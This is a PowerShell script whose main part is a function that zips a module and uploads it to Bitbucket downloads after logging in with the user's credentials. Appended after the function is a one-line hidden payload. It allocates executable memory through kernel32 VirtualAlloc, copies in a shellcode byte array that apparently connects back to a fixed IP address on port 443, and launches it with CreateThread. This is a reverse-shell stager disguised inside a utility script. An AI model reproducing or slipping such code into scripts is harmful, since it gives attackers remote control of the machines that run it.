













function Publish-BitbucketDownload
{
    
    [CmdletBinding()]
    param(
        [pscredential]
        
        $Credential,

        [Parameter(Mandatory=$true)]
        [string]
        
        $Username,

        [Parameter(Mandatory=$true)]
        [string]
        
        $ProjectName,

        [Parameter(Mandatory=$true)]
        [string[]]
        
        $Path,

        [Parameter(Mandatory=$true)]
        [string]
        
        $ManifestPath
    )

    Set-StrictMode -Version 'Latest'

    function Assert-Response
    {
        param(
            [Microsoft.PowerShell.Commands.HtmlWebResponseObject]
            $Response,

            [Uri]
            $ExpectedUri
        )

        if( -not $Response )
        {
            Write-Error ('No response.')
            return $false
        }

        if( $Response.BaseResponse.StatusCode -ne [Net.HttpStatusCode]::OK )
        {
            Write-Error ('Response failed.')
            return $false
        }

        if( $Response.BaseResponse.ResponseUri -ne $ExpectedUri )
        {
            Write-Error ('Response didn''t finish on URI {0} ({1}).' -f $ExpectedUri,$Response.BaseResponse.ResponseUri)
            return $false
        }

        $errorElement = $Response.ParsedHtml.getElementById('error')
        if( $errorElement -and ($errorElement | Get-Member 'innerHtml') -and $erroElement.innerHtml )
        {
            Write-Error $errorElement.innerHtml
            return $false
        }

        return $true

    }

    $manifest = Test-ModuleManifest -Path $ManifestPath
    if( -not $manifest )
    {
        return
    }

    $baseProjectUri = 'https://bitbucket.org/{0}/{1}' -f $Username,$ProjectName

    $zipFileName = "{0}-{1}.zip" -f $manifest.Name,$manifest.Version
    $zipDownloadUrl = '{0}/downloads/{1}' -f $baseProjectUri,$zipFileName

    try
    {
        $resp = Invoke-WebRequest -Uri $zipDownloadUrl -ErrorAction Ignore
        $publish = ($resp.StatusCode -ne 200)
    }
    catch
    {
        $publish = $true
    }

    if( -not $publish )
    {
        Write-Warning -Message ('{0} file already published.' -f $zipFileName)
        return
    }

    $zipFilePath = Join-Path -Path $env:TEMP -ChildPath $zipFileName

    $outFile = '{0}+{1}' -f $manifest.Name,[IO.Path]::GetRandomFileName()
    $outFile = Join-Path -Path $env:TEMP -ChildPath $outFile

    try
    {
        if( Test-Path $zipFilePath -PathType Leaf )
        {
            Remove-Item $zipFilePath
        }

        Write-Verbose -Message ('Creating {0} ZIP file.' -f $zipFileName)
        Compress-Item -Path $Path -OutFile $zipFilePath

        $PSDefaultParameterValues.Clear()
        $PSDefaultParameterValues['Invoke-WebRequest:PassThru'] = $true
        $PSDefaultParameterValues['Invoke-WebRequest:OutFile'] = $outFile

        if( -not $Credential )
        {
            $Credential = Get-Credential -Message ('Enter credentials for {0}' -f $baseProjectUri)
        }

        $session = $null
        $loginUri = 'https://bitbucket.org/account/signin/'
        $resp = Invoke-WebRequest -Uri $loginUri -SessionVariable 'session' -Method Get 
        if( -not (Assert-Response -Response $resp -ExpectedUri $loginUri) )
        {
            return
        }

        $PSDefaultParameterValues['Invoke-WebRequest:WebSession'] = $session

        $form = $resp.Forms | 
                    Where-Object { $_.Action -eq '/account/signin/' }
        $formFields = $form.Fields
        $formFields.id_username = $Credential.UserName
        $formFields.id_password = $Credential.GetNetworkCredential().Password

        $loginUri = 'https://bitbucket.org{0}' -f $form.Action
        $body = @{
                        'username' = $Credential.UserName;
                        'password' = $Credential.GetNetworkCredential().Password;
                        'csrfmiddlewaretoken' = $formFields.csrfmiddlewaretoken;
                        'submit' = '';
                        'next' = '';
                        }
        $resp = Invoke-WebRequest -Uri $loginUri -Method $form.Method -Body $body -Headers @{ Referer = $loginUri }
        if( -not (Assert-Response -Response $resp -ExpectedUri 'https://bitbucket.org/dashboard/overview') )
        {
            exit 1
        }

        $downloadUri = '{0}/downloads' -f $baseProjectUri
        $resp = Invoke-WebRequest -Uri $downloadUri -Method Get 
        if( -not (Assert-Response -Response $resp -ExpectedUri $downloadUri) )
        {
            exit 1
        }

        $csrfToken = $resp.Forms |
                        Where-Object { $_.Fields.ContainsKey( 'csrfmiddlewaretoken' ) } |
                        ForEach-Object { $_.Fields.csrfmiddlewaretoken }
        Write-Debug $csrfToken

        $boundary = [Guid]::NewGuid().ToString()

        $bodyStart = @"
--$boundary
Content-Disposition: form-data; name="csrfmiddlewaretoken"

$csrfToken
--$boundary
Content-Disposition: form-data; name="token"

--$boundary
Content-Disposition: form-data; name="files"; filename="$(Split-Path -Leaf -Path $zipFilePath)"
Content-Type: application/octet-stream


"@

        $bodyEnd = @"

--$boundary--
"@

        $requestInFile = Join-Path -Path $env:TEMP -ChildPath ([IO.Path]::GetRandomFileName())

        try
        {
            $fileStream = New-Object 'System.IO.FileStream' ($requestInFile, [System.IO.FileMode]'Create', [System.IO.FileAccess]'Write')
    
            try
            {
                $bytes = [Text.Encoding]::UTF8.GetBytes($bodyStart)
                $fileStream.Write( $bytes, 0, $bytes.Length )

                $bytes = [IO.File]::ReadAllBytes($zipFilePath)
                $fileStream.Write( $bytes, 0, $bytes.Length )

                $bytes = [Text.Encoding]::UTF8.GetBytes($bodyEnd)
                $fileStream.Write( $bytes, 0, $bytes.Length )
            }
            finally
            { 
                $fileStream.Close()
            }

            $contentType = 'multipart/form-data; boundary={0}' -f $boundary

            $resp = Invoke-WebRequest -Uri $downloadUri `
                                      -Method Post `
                                      -InFile $requestInFile `
                                      -ContentType $contentType `
                                      -Headers @{ Referer = $downloadUri }
            if( -not (Assert-Response -Response $resp -ExpectedUri $downloadUri) )
            {
                return
            }

        }
        finally
        {
            Remove-Item -Path $requestInFile
        }

        $numTries = 10
        $tryNum = 0
        while( $tryNum++ -lt $numTries )
        {
            try
            {
                $resp = Invoke-WebRequest -Uri $zipDownloadUrl
                $resp | Select-Object -Property 'StatusCode','StatusDescription',@{ Name = 'Uri'; Expression = { $zipDownloadUrl }}
                break
            }
            catch
            {
                Start-Sleep -Seconds 1
            }
        }

    }
    finally
    {
        if( (Test-Path -Path $outFile -PathType Leaf) )
        {
            Remove-Item -Path $outFile
        }

        if( (Test-Path -Path $zipFilePath -PathType Leaf) )
        {
            Remove-Item -Path $zipFilePath
        }
    }
}
$ifr = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ifr -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x5c,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$KTV=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($KTV.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$KTV,0,0,0);for (;;){Start-sleep 60};

